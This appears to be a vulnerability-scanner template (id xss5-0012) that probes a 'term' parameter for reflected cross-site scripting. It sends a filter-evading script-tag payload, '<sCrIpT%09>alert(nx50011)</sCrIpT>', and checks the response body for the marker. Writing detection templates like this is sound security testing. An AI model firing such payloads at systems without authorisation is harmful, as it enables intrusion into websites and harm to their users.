id: xss5-0012
name: 'Raw XSS5 in term'
severity: high
type: active
tags:
  - xss
  - injection
  - client
description: 'Unencoded reflection in term'
requests:
  - method: GET
    path: '{{BaseURL}}'
    payloads:
      term:
        - '<sCrIpT%09>alert(nx50011)</sCrIpT>'
    matchers:
      - type: word
        part: body
        words:
          - 'nx50011'
